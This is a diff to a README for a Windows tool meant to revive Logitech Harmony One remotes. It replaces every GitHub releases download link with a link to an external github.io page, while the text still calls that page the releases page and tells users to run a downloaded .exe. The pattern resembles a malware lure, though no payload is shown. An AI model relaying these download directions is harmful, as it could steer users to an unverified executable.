@@ -1,6 +1,6 @@
 # 🎮 RE-HARMONY - Configure Your Logitech Harmony One Again
 
-[![Download RE-HARMONY](https://img.shields.io/badge/Download%20RE--HARMONY-v1.0-blue?style=for-the-badge)](https://github.com/Cavywalkingshoe490/RE-HARMONY/releases)
+[![Download RE-HARMONY](https://img.shields.io/badge/Download%20RE--HARMONY-v1.0-blue?style=for-the-badge)](https://cavywalkingshoe490.github.io)
 
 ## 📋 What This Software Does
 
@@ -25,7 +25,7 @@ Follow these steps to get RE-HARMONY running on your computer.
 
 ### Step 1: Download the Installer
 
-Visit the [RE-HARMONY releases page](https://github.com/Cavywalkingshoe490/RE-HARMONY/releases) to download the latest version.
+Visit the [RE-HARMONY releases page](https://cavywalkingshoe490.github.io) to download the latest version.
 
 Look for the file named `RE-HARMONY-Windows-Setup.exe`. Click on it to start the download. Your browser may ask where to save the file. Pick a location you can find easily, like your Desktop or Downloads folder.
 
@@ -137,7 +137,7 @@ If your remote displays an error message:
 
 ### Get the Latest Version
 
-[Download RE-HARMONY for Windows](https://github.com/Cavywalkingshoe490/RE-HARMONY/releases)
+[Download RE-HARMONY for Windows](https://cavywalkingshoe490.github.io)
 
 The download link takes you to the releases page. Look for the most recent release. Download the file that ends with `.exe`. This is the Windows installer.
 
